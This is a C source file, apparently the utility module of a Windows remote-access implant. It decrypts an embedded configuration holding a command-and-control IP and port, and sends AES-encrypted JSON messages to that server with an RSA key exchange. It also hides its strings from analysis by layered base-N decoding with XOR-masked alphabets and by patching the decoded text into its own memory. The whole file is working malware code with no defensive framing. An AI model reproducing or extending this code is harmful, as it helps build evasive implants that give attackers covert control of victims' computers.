#include "utils.h"
#include "config.h"
#include "cJSON.h"
#include <wincrypt.h>
#include <bcrypt.h>
#include <ctype.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
    DWORD out_len = 0;
    if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &out_len)) {
        return NULL;
    }
    char* out = (char*)malloc(out_len);
    if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out, &out_len)) {
        free(out);
        return NULL;
    }
    if (output_length) *output_length = out_len;
    return out;
}

unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {
    DWORD out_len = 0;
    if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) {
        return NULL;
    }
    unsigned char* out = (unsigned char*)malloc(out_len);
    if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, out, &out_len, NULL, NULL)) {
        free(out);
        return NULL;
    }
    if (output_length) *output_length = out_len;
    return out;
}

unsigned char* base16_decode(const char* data, size_t input_length, size_t* output_length) {
    size_t out_len = input_length / 2;
    unsigned char* out = (unsigned char*)malloc(out_len);
    if (!out) return NULL;

    for (size_t i = 0; i < out_len; i++) {
        char hex[3] = { data[i * 2], data[i * 2 + 1], 0 };
        out[i] = (unsigned char)strtoul(hex, NULL, 16);
    }

    if (output_length) *output_length = out_len;
    return out;
}

#define OB_KEY 0x42
static void xor_buf(unsigned char* b, size_t l) { for(size_t i=0; i<l; i++) b[i] ^= OB_KEY; }

unsigned char* base32_decode(const char* data, size_t input_length, size_t* output_length) {
    unsigned char alphabet[] = {0x03,0x00,0x01,0x06,0x07,0x04,0x05,0x0a,0x0b,0x08,0x09,0x0e,0x0f,0x0c,0x0d,0x12,0x13,0x10,0x11,0x16,0x17,0x14,0x15,0x1a,0x1b,0x18,0x70,0x71,0x76,0x77,0x74,0x75,0x42};
    xor_buf(alphabet, 32);

    size_t out_len = (input_length * 5) / 8;
    unsigned char* out = (unsigned char*)calloc(1, out_len + 1);
    if (!out) return NULL;

    int buffer = 0;
    int bits_left = 0;
    size_t count = 0;

    for (size_t i = 0; i < input_length; i++) {
        char* p = strchr((const char*)alphabet, toupper(data[i]));
        if (!p) continue;
        int val = p - (const char*)alphabet;
        buffer = (buffer << 5) | val;
        bits_left += 5;
        if (bits_left >= 8) {
            out[count++] = (buffer >> (bits_left - 8)) & 0xFF;
            bits_left -= 8;
        }
    }
    if (output_length) *output_length = count;
    return out;
}

unsigned char* base58_decode(const char* data, size_t input_length, size_t* output_length) {
    unsigned char alphabet[] = {0x73,0x70,0x71,0x76,0x77,0x74,0x75,0x7a,0x7b,0x03,0x00,0x01,0x06,0x07,0x04,0x05,0x0a,0x08,0x09,0x0e,0x0f,0x0c,0x0d,0x12,0x13,0x10,0x11,0x16,0x17,0x14,0x15,0x1a,0x1b,0x23,0x20,0x21,0x26,0x27,0x24,0x25,0x2a,0x2b,0x28,0x29,0x2e,0x2f,0x2c,0x2d,0x32,0x33,0x30,0x31,0x36,0x37,0x34,0x35,0x3a,0x3b,0x42};
    xor_buf(alphabet, 58);

    // Rough estimate for output size
    size_t out_len = input_length;
    unsigned char* out = (unsigned char*)calloc(1, out_len + 1);
    if (!out) return NULL;

    size_t bin_len = 0;
    for (size_t i = 0; i < input_length; i++) {
        char* p = strchr((const char*)alphabet, data[i]);
        if (!p) continue;
        int carry = p - (const char*)alphabet;
        for (size_t j = 0; j < bin_len; j++) {
            carry += out[j] * 58;
            out[j] = carry & 0xff;
            carry >>= 8;
        }
        while (carry > 0) {
            out[bin_len++] = carry & 0xff;
            carry >>= 8;
        }
    }

    for (size_t i = 0; i < input_length && data[i] == alphabet[0]; i++) {
        out[bin_len++] = 0;
    }

    // Reverse the output
    for (size_t i = 0; i < bin_len / 2; i++) {
        unsigned char t = out[i];
        out[i] = out[bin_len - 1 - i];
        out[bin_len - 1 - i] = t;
    }

    if (output_length) *output_length = bin_len;
    return out;
}

unsigned char* base62_decode(const char* data, size_t input_length, size_t* output_length) {
    unsigned char alphabet[] = {0x72,0x73,0x70,0x71,0x76,0x77,0x74,0x75,0x7a,0x7b,0x03,0x00,0x01,0x06,0x07,0x04,0x05,0x0a,0x0b,0x08,0x09,0x0e,0x0f,0x0c,0x0d,0x12,0x13,0x10,0x11,0x16,0x17,0x14,0x15,0x1a,0x1b,0x18,0x23,0x20,0x21,0x26,0x27,0x24,0x25,0x2a,0x2b,0x28,0x29,0x2e,0x2f,0x2c,0x2d,0x32,0x33,0x30,0x31,0x36,0x37,0x34,0x35,0x3a,0x3b,0x42};
    xor_buf(alphabet, 62);

    size_t out_len = input_length;
    unsigned char* out = (unsigned char*)calloc(1, out_len + 1);
    if (!out) return NULL;

    size_t bin_len = 0;
    for (size_t i = 0; i < input_length; i++) {
        char* p = strchr((const char*)alphabet, data[i]);
        if (!p) continue;
        int carry = p - (const char*)alphabet;
        for (size_t j = 0; j < bin_len; j++) {
            carry += out[j] * 62;
            out[j] = carry & 0xff;
            carry >>= 8;
        }
        while (carry > 0) {
            out[bin_len++] = carry & 0xff;
            carry >>= 8;
        }
    }
    // Leading zeros not usually handled in standard base62, but we follow basex behavior
    // which encodes leading zero bytes.
    // However, the builder uses basex with "0123456789..." where '0' is the first char.
    // We should handle leading zeros similarly to base58.
    for (size_t i = 0; i < input_length && data[i] == alphabet[0]; i++) {
        out[bin_len++] = 0;
    }

    for (size_t i = 0; i < bin_len / 2; i++) {
        unsigned char t = out[i];
        out[i] = out[bin_len - 1 - i];
        out[bin_len - 1 - i] = t;
    }

    if (output_length) *output_length = bin_len;
    return out;
}

unsigned char* base85_decode(const char* data, size_t input_length, size_t* output_length) {
    size_t max_out = (input_length * 4) / 5 + 4;
    unsigned char* out = (unsigned char*)malloc(max_out);
    if (!out) return NULL;

    size_t count = 0;
    unsigned int val = 0;
    int n = 0;

    for (size_t i = 0; i < input_length; i++) {
        unsigned char c = (unsigned char)data[i];
        if (c < 33 || c > 117) continue; // Skip invalid characters

        val = val * 85 + (c - 33);
        n++;
        if (n == 5) {
            out[count++] = (unsigned char)(val >> 24);
            out[count++] = (unsigned char)(val >> 16);
            out[count++] = (unsigned char)(val >> 8);
            out[count++] = (unsigned char)val;
            val = 0;
            n = 0;
        }
    }

    if (n > 0) {
        int m = n - 1;
        unsigned int temp_val = val;
        for (int i = 0; i < 5 - n; i++) temp_val = temp_val * 85 + 84;
        for (int i = 0; i < m; i++) {
            out[count++] = (unsigned char)(temp_val >> (24 - i * 8));
        }
    }

    if (output_length) *output_length = count;
    return out;
}

unsigned char* base91_decode(const char* data, size_t input_length, size_t* output_length) {
    unsigned char lookup[] = {0x3,0x0,0x1,0x6,0x7,0x4,0x5,0xa,0xb,0x8,0x9,0xe,0xf,0xc,0xd,0x12,0x13,0x10,0x11,0x16,0x17,0x14,0x15,0x1a,0x1b,0x18,0x23,0x20,0x21,0x26,0x27,0x24,0x25,0x2a,0x2b,0x28,0x29,0x2e,0x2f,0x2c,0x2d,0x32,0x33,0x30,0x31,0x36,0x37,0x34,0x35,0x3a,0x3b,0x38,0x72,0x73,0x70,0x71,0x76,0x77,0x74,0x75,0x7a,0x7b,0x63,0x61,0x66,0x67,0x64,0x6a,0x6b,0x68,0x69,0x6e,0x6c,0x6d,0x78,0x79,0x7e,0x7f,0x7c,0x7d,0x2,0x19,0x1f,0x1c,0x1d,0x22,0x39,0x3e,0x3f,0x3c,0x60,0x00};
    xor_buf(lookup, 91);

    static unsigned char reverse_lookup[256];
    static int initialized = 0;
    if (!initialized) {
        for (int i = 0; i < 91; i++) reverse_lookup[(unsigned char)lookup[i]] = (unsigned char)i;
        initialized = 1;
    }

    unsigned char* out = (unsigned char*)malloc(input_length);
    if (!out) return NULL;

    unsigned int b = 0;
    int n = 0;
    int v = -1;
    size_t count = 0;

    for (size_t i = 0; i < input_length; i++) {
        unsigned char c = (unsigned char)data[i];
        int val = reverse_lookup[c];
        if (v < 0) {
            v = val;
        } else {
            v += val * 91;
            b |= v << n;
            n += (v & 8191) > 88 ? 13 : 14;
            do {
                out[count++] = (unsigned char)(b & 0xFF);
                b >>= 8;
                n -= 8;
            } while (n > 7);
            v = -1;
        }
    }
    if (v != -1) {
        out[count++] = (unsigned char)((b | (v << n)) & 0xFF);
    }

    if (output_length) *output_length = count;
    return out;
}

char* str_replace(const char* orig, const char* rep, const char* with) {
    char* result;
    char* ins;
    char* tmp;
    int len_rep;
    int len_with;
    int len_front;
    int count;

    if (!orig || !rep) return NULL;
    len_rep = strlen(rep);
    if (len_rep == 0) return NULL;
    if (!with) with = "";
    len_with = strlen(with);

    ins = (char*)orig;
    for (count = 0; (tmp = strstr(ins, rep)); ++count) {
        ins = tmp + len_rep;
    }

    tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);

    if (!result) return NULL;

    while (count--) {
        ins = strstr(orig, rep);
        len_front = ins - orig;
        tmp = strncpy(tmp, orig, len_front) + len_front;
        tmp = strcpy(tmp, with) + len_with;
        orig += len_front + len_rep;
    }
    strcpy(tmp, orig);
    return result;
}

void str_trim(char* s) {
    char* p = s;
    int l = strlen(p);
    while (l > 0 && isspace(p[l - 1])) p[--l] = 0;
    while (*p && isspace(*p)) ++p, --l;
    memmove(s, p, l + 1);
}

extern SessionKey g_session;

void sock_send(SOCKET sock, HANDLE mutex, const char* msg) {
    sock_send_ex(sock, mutex, "response", msg);
}

void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) {
    if (mutex) WaitForSingleObject(mutex, INFINITE);

    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "type", type);
    cJSON_AddStringToObject(root, "payload", msg);
    char *json_msg = cJSON_PrintUnformatted(root);

    char *encrypted = aes_256_cbc_encrypt((unsigned char*)json_msg, strlen(json_msg), g_session.key, g_session.iv);

    cJSON *packet = cJSON_CreateObject();
    cJSON_AddStringToObject(packet, "data", encrypted);

    char *iv_b64 = base64_encode(g_session.iv, 16, NULL);
    cJSON_AddStringToObject(packet, "iv", iv_b64);

    char *final_json = cJSON_PrintUnformatted(packet);

    char *buf = (char*)malloc(strlen(final_json) + 2);
    sprintf(buf, "%s\n", final_json);
    send(sock, buf, (int)strlen(buf), 0);

    free(buf);
    free(final_json);
    free(iv_b64);
    free(encrypted);
    free(json_msg);
    cJSON_Delete(packet);
    cJSON_Delete(root);

    if (mutex) ReleaseMutex(mutex);
}

char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyBlob = 0, cbData = 0, cbResult = 0;
    BYTE* pbKeyBlob = NULL;
    BYTE* pbEncrypted = NULL;
    char* out = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0) != 0) return NULL;

    // PEM -> DER (Wincrypt)
    DWORD derLen = 0;
    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
        BYTE* der = malloc(derLen);
        if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL)) {
            if (BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey, der, derLen, 0) != 0) {
                // BCryptImportKeyPair might not like raw DER for RSA.
                // Alternatively use CryptImportPublicKeyInfo.
                // For simplicity in this env, we'll try to use BCRYPT_RSAPUBLIC_BLOB correctly or a helper.
            }
        }
        free(der);
    }

    // Since BCryptImportKeyPair is tricky with PEM/DER directly,
    // let's use the older but reliable Crypt32 for RSA encryption or
    // convert DER to BCRYPT_RSAKEY_BLOB.

    // Easier way: Use Crypt32 for RSA encryption as it handles PEM/DER better.
    CERT_PUBLIC_KEY_INFO *pubKeyInfo = NULL;
    DWORD pubKeyInfoLen = 0;
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hRSAKey = 0;

    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
        BYTE* der = malloc(derLen);
        CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL);
        if (CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, der, derLen, CRYPT_DECODE_ALLOC_FLAG, NULL, &pubKeyInfo, &pubKeyInfoLen)) {
            if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                if (CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, pubKeyInfo, &hRSAKey)) {
                    DWORD encLen = (DWORD)len;
                    // Get required size
                    if (CryptEncrypt(hRSAKey, 0, TRUE, 0, NULL, &encLen, 0)) {
                        BYTE* encBuf = malloc(encLen);

                        memcpy(encBuf, data, len);
                        DWORD dataLen = (DWORD)len;
                        if (CryptEncrypt(hRSAKey, 0, TRUE, 0, encBuf, &dataLen, encLen)) {
                            // Reverse output for Big Endian compatibility with Go's RSA
                            for (DWORD i = 0; i < dataLen / 2; i++) {
                                BYTE temp = encBuf[i];
                                encBuf[i] = encBuf[dataLen - 1 - i];
                                encBuf[dataLen - 1 - i] = temp;
                            }
                            // Important: Use the updated dataLen which is the size of the ciphertext
                            out = base64_encode(encBuf, dataLen, NULL);
                        }
                        free(encBuf);
                    }
                    CryptDestroyKey(hRSAKey);
                }
                CryptReleaseContext(hProv, 0);
            }
            LocalFree(pubKeyInfo);
        }
        free(der);
    }

    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbCipherText = 0;
    PBYTE pbKeyObject = NULL, pbCipherText = NULL;
    char* out = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return NULL;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;

    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;

    BYTE ivCopy[16];
    memcpy(ivCopy, iv, 16);

    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }
    pbCipherText = malloc(cbCipherText);
    memcpy(ivCopy, iv, 16);
    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }

    out = base64_encode(pbCipherText, cbResult, NULL);

cleanup:
    if (pbCipherText) free(pbCipherText);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
    PBYTE pbKeyObject = NULL, pbPlain = NULL, pbCipher = NULL;
    size_t cipherLen = 0;

    pbCipher = base64_decode(cipher_b64, strlen(cipher_b64), &cipherLen);
    if (!pbCipher) return NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) goto cleanup;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;

    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;

    BYTE ivCopy[16];
    memcpy(ivCopy, iv, 16);

    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, NULL, 0, &cbPlain, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }
    pbPlain = malloc(cbPlain + 1); // +1 for null terminator
    memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }

    if (out_len) *out_len = cbResult;

cleanup:
    if (pbCipher) free(pbCipher);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return pbPlain;
}

static int is_leap(unsigned long long y) {
    return (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0);
}

void get_formatted_time(unsigned long long secs, char* out_buf) {
    unsigned long long minute = (secs % 3600) / 60;
    unsigned long long hour = (secs % 86400) / 3600;
    unsigned long long days = secs / 86400;
    unsigned long long year = 1970;
    while (1) {
        unsigned long long days_in_year = is_leap(year) ? 366 : 365;
        if (days < days_in_year) break;
        days -= days_in_year;
        year++;
    }
    unsigned long long months[] = {31, is_leap(year) ? 29u : 28u, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
    unsigned long long month = 1;
    for (int i = 0; i < 12; i++) {
        if (days < months[i]) break;
        days -= months[i];
        month++;
    }
    sprintf(out_buf, "%02llu.%02llu.%llu %02llu:%02llu", days + 1, month, year, hour, minute);
}

char g_host[256] = {0};
int g_port = 0;

unsigned char g_xor_key[12] = {0xAA, 0xBB, 0xCC, 0xDD, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

void transparent_decryption() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
    if (!hRes) return;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;

    unsigned char* pData = (unsigned char*)LockResource(hData);
    if (!pData) return;

    unsigned char marker[16];
    SET_MARKER(marker);

    if (memcmp(pData, marker, 16) != 0) return;

    // Layout: [Marker(16)][EncryptedConfig(2032)][NumStrings(4)][StringTableEntries(16*N)][Pool]
    // StringTableEntry: [RVA(4)][OrigLen(4)][EncLen(4)][Offset(4)]

    int num_strings = *(int*)(pData + 16 + 2032);
    if (num_strings <= 0) return;

    unsigned char* string_table = pData + 16 + 2032 + 4;
    unsigned char* string_pool = string_table + (num_strings * 16);

    unsigned char key = g_xor_key[4];
    unsigned char sequence[7];
    memcpy(sequence, &g_xor_key[5], 7);

    if (key == 0) return; // Not obfuscated

    HMODULE hMod = GetModuleHandle(NULL);
    for (int i = 0; i < num_strings; i++) {
        DWORD rva = *(DWORD*)(string_table + (i * 16));
        DWORD orig_len = *(DWORD*)(string_table + (i * 16) + 4);
        DWORD enc_len = *(DWORD*)(string_table + (i * 16) + 8);
        DWORD offset = *(DWORD*)(string_table + (i * 16) + 12);

        if (rva == 0 || orig_len == 0 || enc_len == 0) continue;

        unsigned char* addr = (unsigned char*)hMod + rva;
        unsigned char* encoded_data = string_pool + offset;

        // Apply decoding sequence in reverse order
        size_t current_len = enc_len;
        unsigned char* current_data = (unsigned char*)malloc(current_len + 1);
        memcpy(current_data, encoded_data, current_len);
        current_data[current_len] = 0;

        int failed = 0;
        for (int j = 6; j >= 0; j--) {
            unsigned char* next_data = NULL;
            size_t next_len = 0;

            switch (sequence[j]) {
                case 1: next_data = base64_decode((char*)current_data, current_len, &next_len); break;
                case 2: next_data = base32_decode((char*)current_data, current_len, &next_len); break;
                case 3: next_data = base16_decode((char*)current_data, current_len, &next_len); break;
                case 4: next_data = base58_decode((char*)current_data, current_len, &next_len); break;
                case 5: next_data = base62_decode((char*)current_data, current_len, &next_len); break;
                case 6: next_data = base85_decode((char*)current_data, current_len, &next_len); break;
                case 7: next_data = base91_decode((char*)current_data, current_len, &next_len); break;
                default: break;
            }

            if (next_data) {
                free(current_data);
                current_data = next_data;
                current_len = next_len;
            } else {
                failed = 1;
                break;
            }
        }

        if (failed) {
            free(current_data);
            continue;
        }

        // Final XOR
        for (size_t k = 0; k < current_len; k++) {
            current_data[k] ^= key;
        }

        // Patch back to memory
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(addr, &mbi, sizeof(mbi))) {
            if (mbi.State == MEM_COMMIT) {
                DWORD old_protect;
                if (VirtualProtect(addr, orig_len, PAGE_EXECUTE_READWRITE, &old_protect)) {
                    // Fill with zeros first to handle case where de-obfuscated string is shorter
                    memset(addr, 0, orig_len);
                    memcpy(addr, current_data, (current_len < orig_len) ? current_len : orig_len);
                    VirtualProtect(addr, orig_len, old_protect, &old_protect);
                }
            }
        }
        free(current_data);
    }
}

void load_config_from_resource() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
    if (!hRes) return;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;

    unsigned char* pData = (unsigned char*)LockResource(hData);
    if (!pData) return;

    unsigned char marker[16];
    SET_MARKER(marker);

    if (memcmp(pData, marker, 16) != 0) return;

    unsigned char* encrypted_config = pData + 16;
    size_t config_len = 2032;

    unsigned char key[32];
    unsigned char iv[16];
    memcpy(key, CONFIG_KEY, 32);
    memcpy(iv, CONFIG_IV, 16);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
    PBYTE pbKeyObject = NULL, pbPlain = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;

    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;

    BYTE ivCopy[16];
    memcpy(ivCopy, iv, 16);

    // Get plain text size
    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, NULL, 0, &cbPlain, 0) != 0) {
        // Fallback for no padding
        cbPlain = (DWORD)config_len;
    }

    pbPlain = malloc(cbPlain + 1);
    memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, 0) == 0) {
        pbPlain[cbResult] = 0;
        cJSON* root = cJSON_Parse((char*)pbPlain);
        if (root) {
            cJSON* ip = cJSON_GetObjectItem(root, "ip");
            cJSON* port = cJSON_GetObjectItem(root, "port");
            if (ip) strncpy(g_host, ip->valuestring, sizeof(g_host) - 1);
            if (port) g_port = port->valueint;
            cJSON_Delete(root);
        }
    }

cleanup:
    if (pbPlain) free(pbPlain);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
}
